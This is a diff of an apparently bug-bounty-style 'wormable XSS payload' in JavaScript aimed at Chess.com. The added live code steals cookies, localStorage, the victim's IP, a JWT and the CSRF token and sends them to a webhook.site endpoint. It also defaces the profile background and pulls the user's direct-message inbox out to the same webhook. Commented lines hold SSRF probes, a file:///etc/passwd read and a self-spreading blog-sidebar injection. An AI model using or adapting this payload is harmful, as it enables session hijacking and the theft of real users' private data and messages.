@@ -1,7 +1,7 @@
 // ==========================================
 // Wormable XSS Payload - Chess.com 
 // ==========================================
-alert("XSS by Hussein on: " + document.domain);
+alert("XSS 2 by Hussein on: " + document.domain);
 
 // <img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
 // <link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
@@ -48,15 +48,15 @@ alert("XSS by Hussein on: " + document.domain);
 // x.open("GET", "file:///etc/passwd");
 // x.send();
 
-var userCookies = document.cookie;
-var userStorage = JSON.stringify(localStorage);
-var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;
+// var userCookies = document.cookie;
+// var userStorage = JSON.stringify(localStorage);
+// var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;
 
-fetch("https://webhook.site/52bfb7b5-26b8-4e09-8f3e-3914f4ff53c0", {
-    method: "POST",
-    mode: "no-cors",
-    body: exfilData
-});
+// fetch("https://webhook.site/52bfb7b5-26b8-4e09-8f3e-3914f4ff53c0", {
+//     method: "POST",
+//     mode: "no-cors",
+//     body: exfilData
+// });
 // const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
 // const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";
 // const requestBody = {
@@ -90,19 +90,29 @@ fetch("https://webhook.site/52bfb7b5-26b8-4e09-8f3e-3914f4ff53c0", {
 
 
 
-// 1. Setup Webhook
 const webhook = 'https://webhook.site/52bfb7b5-26b8-4e09-8f3e-3914f4ff53c0'; 
+
+// 1. Exfiltrate Non-HttpOnly Cookies & LocalStorage
+var userCookies = document.cookie;
+var userStorage = JSON.stringify(localStorage);
+var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;
+
+fetch(webhook, {
+    method: "POST",
+    mode: "no-cors",
+    body: exfilData
+});
 
 // 2. Extract Sensitive Data (IP, CSRF, and Authentication JWT)
 const victimIP = window.context.ip;
 const csrfToken = window.context.csrf.token;
 const jwtToken = window.context.user.intercomUserJwt; 
 
-// 3. PII & Token Leakage (Exfiltrate IP and JWT immediately)
+// 3. PII & Token Leakage (Exfiltrate IP and JWT immediately via GET)
 fetch(webhook + '?stolen_ip=' + victimIP + '&stolen_jwt=' + jwtToken, { mode: 'no-cors' });
 
 // 4. Background Defacement (State Modification)
-const b64Data = 'iVBORw0KGgoAAAANSUhEUgAAAJYAAACUCAMAAABGFyDbAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAACTUExURf////r///H//+Dq6trV1dy8vNuoqNyQkOCLi+R7e/f//+/v7+7Y2OnJydiUlN5oaOAXF+0AAP8AANtfX+Tj49iqquhzc+1TU+0KCvcAAO/p6enOztd+ftrOzuxBQfQAANadnd4uLucyMtl5eebY2N5YWNxMTNzCwvsAAO0vL+0lJdixsfMdHeIkJN5EROO2tu9gYHcVvsQAAAABYktHRACIBR1IAAAAB3RJTUUH6gIJFg0VvBvLygAAADB0RVh0Y29tbWVudAAvPjxzY3JpcHQ+YWxlcnQoIlhTU19TVUNDRVNTIik7PC9zY3JpcHQ+GPVOugAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNi0wMi0wOVQyMjoxMjoxNyswMDowMJrmdFYAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjYtMDItMDlUMjI6MTI6MTErMDA6MDCIa/nQAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDI2LTAyLTA5VDIyOjEzOjIxKzAwOjAwvjO00gAAA7pJREFUeNrtnItyqjAQhkG8oGjRqIhKvSC1trW17/90h6gMoKBckuw/0/O9AP8ky+4m2V1N+w8Fegi1hgQNo9lqd0yzG2KanXaraTQo9fSs/uDFHo7YHaPhuDPoWz31mvTJ1Jm5c5bL3J057YnKbdUXS2/ICjH0lgs10vRXc7UuJoqzXpmv0oXpi822uKSI7UbukhmeX14Ux98Z0lYqGM+riTr/AuNAyooZjltdFMd1xK+Y5ZUw8zzWniV2/6ar+qI4q6nAnQzexIjivPUFiepNaxpVGncqJChZe5GiOHsBFvbui1YVerH3uhu4ES+Ks6m1kQ37IEfWwa6Rk02Em1XMflJZlS9PVWhgFXUtP2SqYuxjWUVVU6i3ymLUrLBWn7JVMfZZer0m0tfqvF4l7SvwVagK7T4oo6qhSFWoq4T/ssaqVDE2Lh4gd5J8exaHXVFVX+pEcb4KmvtRraxjIbNvfKtVxdh3AbPXTdWqGDOfJ/itGmfBqsxbT7dQiXe/xX2yjRRbyHmyjctR/U9UYfQwaOs/NKoY+3m0XC0qVYw9sHqLbLEYm+XHxo3CWHjLYYPlHCJynUSbUhVj7RzLmtHKyrGuE0HYSTI/Zcoi/A0v/GSpalKrYizj3EgVDZNkRMaFoNvROqwW93GH2OA5GXmXTa2JY995eKKMJs3o1tO/Uyu6cHOpqnvUgi546X+ROvBE3ASgvuIjax7H9BvHiTDTSnJIx0UQ0wqNKyVL+QE/j++U1xLwWCiGddJzAWQPEcksQvGN1iOSt10ASU2EmfDxDrWYGCf2871fajExv/GTHkro4STCz8KnFhPjxxlqX8H7TlE+46hIdauVReKmawnj5EM3Dy9rgCRrEMsCOIxFzPFlYW4iqMmjysJ0p6DBBzRUgyY2oGkgaNIMesRAPZCBHl9BD/tawWYB+aSuRlAvkkCv3UAvKVHCz82VLugFOOhzAerjCuhTFOrDHegzJ+ijMEIWkVl6jVlwgFqeQR2A8kqlMEt/UAulaMvK8hYLtggPtGQRtcATtBwWtXgYtNQatTAdtYwftOkBtUUEtaEGtf0ItVlLa1QY+lCNbanWXMxGQFVtk27ptlzMJlMVLbluhZZc1AZm1HZv1OZ41FECqIMXNNAxFRrqUA/UESia4IExJaPgIzDH62igw4g4hlMzx5cxuonvZGDXGXRlB9JG0Bk7v5ooiWPBzisGOUTtrAxw5Nx1yQAH9F2l4Y0zvPJo+KP9QjP8MSYalbnrdncIozLT6DrYZNE/xD/Km2hTBSqgTgAAAABJRU5ErkJggg==';
+const b64Data = 'iVBORw0KGgoAAAANSUhEUgAAAJYAAACUCAMAAABGFyDbAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAACTUExURf////r///H//+Dq6trV1dy8vNuoqNyQkOCLi+R7e/f//+/v7+7Y2OnJydiUlN5oaOAXF+0AAP8AANtfX+Tj49iqquhzc+1TU+0KCvcAAO/p6enOztd+ftrOzuxBQfQAANadnd4uLucyMtl5eebY2N5YWNxMTNzCwvsAAO0vL+0lJdixsfMdHeIkJN5EROO2tu9gYHcVvsQAAAABYktHRACIBR1IAAAAB3RJTUUH6gIJFg0VvBvLygAAADB0RVh0Y29tbWVudAAvPjxzY3JpcHQ+YWxlcnQoIlhTU19TVUNDRVNTIik7PC9zY3JpcHQ+GPVOugAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNi0wMi0wOVQyMjoxMjoxNyswMDowMJrmdFYAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjYtMDItMDlUMjI6MTI6MTErMDA6MDCIa/nQAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDI2LTAyLTA5VDIyOjEzOjIxKzAwOjAwvjO00gAAA7pJREFUeNrtnItyqjAQhkG8oGjRqIhKvSC1trW17/90h6gMoKBckuw/0/O9AP8ky+4m2V1N+w8Fegi1hgQNo9lqd0yzG2KanXaraTQo9fSs/uDFHo7YHaPhuDPoWz31mvTJ1Jm5c5bL3J057YnKbdUXS2/ICjH0lgs10vRXc7UuJoqzXpmv0oXpi822uKSI7UbukhmeX14Ux98Z0lYqGM+riTr/AuNAyooZjltdFMd1xK+Y5ZUw8zzWniV2/6ar+qI4q6nAnQzexIjivPUFiepNaxpVGncqJChZe5GiOHsBFvbui1YVerH3uhu4ES+Ks6m1kQ37IEfWwa6Rk02Em1XMflJZlS9PVWhgFXUtP2SqYuxjWUVVU6i3ymLUrLBWn7JVMfZZer0m0tfqvF4l7SvwVagK7T4oo6qhSFWoq4T/ssaqVDE2Lh4gd5J8exaHXVFVX+pEcb4KmvtRraxjIbNvfKtVxdh3AbPXTdWqGDOfJ/itGmfBqsxbT7dQiXe/xX2yjRRbyHmyjctR/U9UYfQwaOs/NKoY+3m0XC0qVYw9sHqLbLEYm+XHxo3CWHjLYYPlHCJynUSbUhVj7RzLmtHKyrGuE0HYSTI/Zcoi/A0v/GSpalKrYizj3EgVDZNkRMaFoNvROqwW93GH2OA5GXmXTa2JY995eKKMJs3o1tO/Uyu6cHOpqnvUgi546X+ROvBE3ASgvuIjax7H9BvHiTDTSnJIx0UQ0wqNKyVL+QE/j++U1xLwWCiGddJzAWQPEcksQvGN1iOSt10ASU2EmfDxDrWYGCf2871fajExv/GTHkro4STCz8KnFhPjxxlqX8H7TlE+46hIdauVReKmawnj5EM3Dy9rgCRrEMsCOIxFzPFlYW4iqMmjysJ0p6DBBzRUgyY2oGkgaNIMesRAPZCBHl9BD/tawWYB+aSuRlAvkkCv3UAvKVHCz82VLugFOOhzAerjCuhTFOrDHegzJ+ijMEIWkVl6jVlwgFqeQR2A8kqlMEt/UAulaMvK8hYLtggPtGQRtcATtBwWtXgYtNQatTAdtYwftOkBtUUEtaEGtf0ItVlLa1QY+lCNbanWXMxGQFVtk27ptlzMJlMVLbluhZZc1AZm1HZv1OZ41FECqrqUA/UESia4IExJaPgIzDH62igw4g4hlMzx5cxuonvZGDXGXRlB9JG0Bk7v5ooiWPBzisGOUTtrAxw5Nx1yQAH9F2l4Y0zvPJo+KP9QjP8MSYalbnrdncIozLT6DrYZNE/xD/Km2hTBSqgTgAAAABJRU5ErkJggg==';
 const byteCharacters = atob(b64Data);
 const byteNumbers = new Array(byteCharacters.length);
 for (let i = 0; i < byteCharacters.length; i++) {
@@ -121,14 +131,14 @@ fetch('https://www.chess.com/callback/member/upload/background', {
     credentials: 'include'
 });
 
-// 5. Account Data Leakage (Exfiltrate DMs)
-fetch('https://www.chess.com/messages/chesscom', {
+// 5. Account Data Leakage (Exfiltrate DMs via the JSON API Endpoint)
+fetch('https://www.chess.com/callback/messages/list/inbox', {
     method: 'GET',
     credentials: 'include'
 })
-.then(response => response.text())
+.then(response => response.text()) // بنقرأها كنص عشان نبعتها زي ما هي للـ Webhook
 .then(data => {
-    fetch(webhook, { method: 'POST', body: data, mode: 'no-cors' });
+    fetch(webhook, { method: 'POST', body: "===== INBOX JSON =====\n" + data, mode: 'no-cors' });
 });
 
 
